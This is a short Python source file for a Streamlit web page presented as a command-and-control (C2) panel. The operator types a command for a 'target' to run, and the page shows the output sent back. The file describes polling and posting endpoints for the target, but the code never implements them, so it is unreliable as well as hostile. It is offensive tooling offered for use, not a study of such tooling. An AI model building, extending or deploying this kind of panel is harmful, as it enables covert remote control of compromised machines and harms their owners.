import streamlit as st
import json
import os

# Define filenames for storing commands and results
COMMAND_FILE = "command.json"
RESULT_FILE = "results.json"

# Initialize files if they don't exist
if not os.path.exists(COMMAND_FILE):
    with open(COMMAND_FILE, "w") as f:
        json.dump({"command": ""}, f)
if not os.path.exists(RESULT_FILE):
    with open(RESULT_FILE, "w") as f:
        json.dump({"results": []}, f)

st.title("C2 Panel via Streamlit")

# Section to send commands to the target
st.header("Send Command")
command_input = st.text_input("Enter command:")
if st.button("Update Command"):
    with open(COMMAND_FILE, "w") as f:
        json.dump({"command": command_input}, f)
    st.success("Command updated!")

# Section to view incoming results from the target
st.header("Collected Results")
with open(RESULT_FILE, "r") as f:
    data = json.load(f)
results = data.get("results", [])
st.text_area("Results", "\n".join(results), height=300)

# API-like endpoints:
st.markdown("### API Endpoints (for target use)")
st.markdown("**Get Command:** `GET /get_command`")
st.markdown("**Post Result:** `POST /post_result` with JSON body `{'result': 'your command output'}`")
